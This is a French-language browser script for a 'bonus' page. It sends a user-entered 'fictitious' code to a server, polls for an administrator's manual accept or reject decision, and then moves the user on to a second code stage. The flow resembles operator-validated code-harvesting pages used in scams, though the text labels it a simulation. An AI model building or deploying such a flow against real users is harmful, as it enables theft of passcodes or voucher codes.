// ============================================
// FUNTONE BONUS INTERNATIONAL
// PREMIER CODE FICTIF
// ============================================

const API = window.location.origin;

// ÉLÉMENTS HTML
const form = document.getElementById("codeForm");
const input = document.getElementById("demoCode");
const button = document.getElementById("verifyBtn");
const message = document.getElementById("message");

// RÉCUPÉRER LA RÉFÉRENCE
const parametres = new URLSearchParams(window.location.search);
const reference = parametres.get("reference");

// VARIABLES
let verificationEnCours = false;
let intervalleVerification = null;

// AFFICHER UN MESSAGE
function afficherMessage(texte, couleur) {
message.textContent = texte;
message.style.color = couleur;
}

// VÉRIFIER LA RÉFÉRENCE
if (!reference) {
form.style.display = "none";

afficherMessage(
    "Référence de participation introuvable. Veuillez reprendre votre inscription.",
    "#D32F2F"
);

}

// TRANSMETTRE LE PREMIER CODE
form.addEventListener("submit", async function (event) {

event.preventDefault();

if (!reference || verificationEnCours) {
    return;
}

const code = input.value.trim();

if (!code) {
    afficherMessage(
        "Veuillez saisir votre code fictif.",
        "#D32F2F"
    );
    return;
}

verificationEnCours = true;

button.disabled = true;
input.disabled = true;
button.textContent = "Transmission...";

afficherMessage(
    "Transmission de votre code fictif...",
    "#D96B27"
);

try {
    const response = await fetch(
        `${API}/api/demo-codes/premier`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                reference: reference,
                code: code
            })
        }
    );

    const resultat = await response.json();

    if (!response.ok) {
        throw new Error(
            resultat.message || "Erreur de transmission."
        );
    }

    afficherMessage(
        "Votre code fictif a été transmis. Validation en attente...",
        "#258443"
    );

    button.textContent = "Validation en attente";

    demarrerVerification();

} catch (erreur) {
    verificationEnCours = false;

    input.disabled = false;
    button.disabled = false;
    button.textContent = "Vérifier";

    afficherMessage(
        erreur.message || "Impossible de transmettre le code.",
        "#D32F2F"
    );
}

});

// DÉMARRER LA VÉRIFICATION AUTOMATIQUE
function demarrerVerification() {

if (intervalleVerification) {
    clearInterval(intervalleVerification);
}

intervalleVerification = setInterval(
    verifierStatut,
    3000
);

verifierStatut();

}

// CONSULTER LE STATUT
async function verifierStatut() {

try {
    const response = await fetch(
        `${API}/api/demo-codes/premier/${encodeURIComponent(reference)}`,
        {
            cache: "no-store"
        }
    );

    const resultat = await response.json();

    if (!response.ok) {
        throw new Error(
            "Impossible de vérifier la validation."
        );
    }

    traiterStatut(resultat.statut);

} catch (erreur) {
    console.error("Erreur de vérification :", erreur);
}

}

// TRAITER LA DÉCISION DE L'ADMINISTRATEUR
function traiterStatut(statut) {

if (statut === "simulation_acceptee") {

    clearInterval(intervalleVerification);

    verificationEnCours = false;

    afficherMessage(
        "Votre premier code fictif a été accepté.",
        "#258443"
    );

    button.textContent = "Accès à la deuxième étape...";

    setTimeout(function () {
        window.location.href =
            `deuxieme-code.html?reference=${encodeURIComponent(reference)}`;
    }, 2000);

    return;
}

if (statut === "simulation_rejetee") {

    clearInterval(intervalleVerification);

    verificationEnCours = false;

    input.disabled = false;
    input.value = "";

    button.disabled = false;
    button.textContent = "Réessayer";

    afficherMessage(
        "Votre code fictif a été refusé. Vous pouvez réessayer.",
        "#D32F2F"
    );

    return;
}

if (statut === "simulation_en_attente") {

    afficherMessage(
        "Votre code fictif est en cours de validation. Veuillez patienter...",
        "#D96B27"
    );
}

}

// NETTOYAGE À LA FERMETURE DE LA PAGE
window.addEventListener("beforeunload", function () {

if (intervalleVerification) {
    clearInterval(intervalleVerification);
}

});